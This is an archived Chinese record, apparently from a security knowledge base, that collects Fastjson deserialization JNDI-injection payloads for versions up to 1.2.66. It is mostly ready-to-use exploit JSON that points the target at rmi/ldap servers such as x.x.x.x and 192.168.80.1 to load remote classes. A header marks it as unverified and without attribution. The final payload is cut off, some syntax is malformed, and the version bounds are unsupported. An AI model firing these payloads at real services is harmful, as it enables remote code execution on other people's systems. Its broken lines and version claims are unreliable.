---
source: "历史归档批(无原始出处标注)"
product: "Fastjson multi-version JNDI"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Fastjson 多版本payload集合"
prerequisites: "来源所述条件，未列明部分仍待核：<=24/41/42/43/45/47/62/66; AutoType conditions mostly41–45,66; dependencies/JDK omitted"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-991e2cd958295ebc33995fbc"
entity_id: "ve-991e2cd958295ebc33995fbc"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：&lt;=24/41/42/43/45/47/62/66; AutoType conditions mostly41–45,66; dependencies/JDK omitted

代码与实验材料：Short payload matrix; final iBatis JSON truncates at properties:{; XBean trailingquote; nonstandard43 syntax may be intentional

来源证据范围：No original attribution

- **适用与权限边界（1）**：Last payload incomplete; missinggadget versions and AutoType requirement for62。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（2）**：Version boundaries unsupported; do not normalize intentional parser oddities blindly。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Fastjson 多版本payload集合

影响版本：

### fastjson<=1.2.24

exp：

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://x.x.x.x:1099/jndi", "autoCommit":true}
```

影响版本：

### fastjson<=1.2.41

前提：
autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）

exp：

```
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://x.x.x.x:1098/jndi", "autoCommit":true}
```

影响版本：

### fastjson<=1.2.42

前提：
autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）

exp：

```
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://localhost:1399/Exploit", "autoCommit":true}
```

影响版本：

### fastjson<=1.2.43

前提：
autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）

exp：

```
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://localhost:1399/Exploit", "autoCommit":true}
```

影响版本：

### fastjson<=1.2.45

前提：
autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）

exp：

```
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1399/Exploit"}}
```

影响版本：

### fastjson<=1.2.47

exp：

```
{
    "a": {
        "@type": "java.lang.Class", 
        "val": "com.sun.rowset.JdbcRowSetImpl"
    }, 
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl", 
        "dataSourceName": "ldap://x.x.x.x:1999/Exploit", 
        "autoCommit": true
    }
}
```

影响版本：

### fastjson<=1.2.62

exp：

```
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1098/exploit"}"
```

影响版本：

### fastjson<=1.2.66

前提：
autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）

exp：

```
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}

{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}

{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}

{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {
```